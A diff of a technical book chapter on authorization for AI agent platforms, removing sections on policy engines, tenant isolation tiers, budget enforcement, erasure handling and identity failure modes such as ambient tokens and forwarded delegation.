+Authorization assumes the enforcement path sees the real request and cannot be bypassed. The runtime must therefore isolate generated code, mediate network and tool access, protect broker credentials and audit records, and screen the data that reaches the planner. Those mechanisms are the subject of @sec-runtime-safety. Authorization supplies the exact boundary they must enforce; runtime safety makes that boundary real.
 :::
-
-### The component that answers the verb
-
-The component that actually answers "may this caller take this action on this
-resource?" is a policy engine, and it is the most visible artifact of the
-fabric. OPA / Rego is Kubernetes-native and data-driven, with a real learning
-curve. AWS Cedar is typed and analyzable, so you can ask formal questions of a
-policy ("can any principal ever reach this resource?") rather than only
-testing it. Oso is authorization as a library with a relationship model;
-Permit.io composes these backends behind one API. The query these engines
-answer became a standard of its own in January 2026, when the OpenID
-Foundation finalized the AuthZEN Authorization API: one vendor-neutral wire
-format for the per-action question, whichever engine sits behind it
-[@authzen2026]. A production system runs two
-policy surfaces and should keep them separate: the resource-access policy that
-identity owns ("can this identity read this resource?") and the action-risk
-policy that governance owns ("may this agent send this email?"), because they
-change for different reasons and on different cadences, and the latter is
-where human approval is placed (@sec-oversight-control).
-
-### The isolation tiers
-
-The isolation tiers, chosen per resource class:
-
-| Tier | Mechanism | Blast radius on bug | Fit |
-|------|-----------|----------------------|-----|
-| Logical | Shared DB plus tenant column plus enforced filter | One missing `WHERE` leaks everything | Dev, internal tools, low-stakes SaaS |
-| Namespace | Separate schemas or namespaces per tenant | Misrouted query hits one wrong tenant | Most B2B SaaS |
-| Physical | Separate DBs, clusters, or accounts per tenant | Bug stays inside one tenant | Regulated, large enterprise, sovereign cloud |
-
-A mature platform mixes tiers deliberately: sessions logically partitioned for
-cost, high-sensitivity memory physically isolated, audit as a shared physical
-store with tenant-tagged rows. The trap that runs underneath all of it is
-implicit tenancy from request headers: if `tenant_id` is read from an HTTP
-header with no cryptographic binding (a JWT claim, an mTLS client cert), a
-single spoofed header bypasses the most carefully chosen physical tier at the
-front door.
-
-### Closing the loop
-
-Two operational patterns close the loop. Budget enforcement must be
-synchronous with the call, living in the model-access fabric or the gateway,
-the only points with both per-call context and the authority to refuse; a
-budget enforced by the billing system is an alert, not enforcement, because it
-fires after the spend. Right-to-erasure, in tension with audit's demand that
-the record persist, is resolved by tombstone-plus-proof: purge the payload,
-keep the tamper-evident chain intact, and prove the deletion rather than
-silently dropping a row.
-
-The recurring failure modes are all identity edges drawn imprecisely. Ambient
-authority is the GitHub MCP shape: one long-lived token, every call, prompt
-injection triggers anything it permits. Agent-to-agent delegation that
-forwards the user's token hands the next agent the user's full authority with
-none of the user's intent attached; the correct shape is a delegated,
-attenuated token that names the chain and narrows scope at each hop, and
-botched delegation is a leading cause of multi-agent failure
-[@cemri2025multiagent] (@sec-multi-agent-systems). Cross-tenant retrieval
-bleed-over is the highest-risk class, mitigated by partition-at-write over
-filter-at-read. Silent tenant coupling, where a resource inherits tenancy
-implicitly at creation, becomes unshareable and un-re-parentable without a
-migration that implicit tenancy is exactly unable to express.
 
 ## Further reading
 
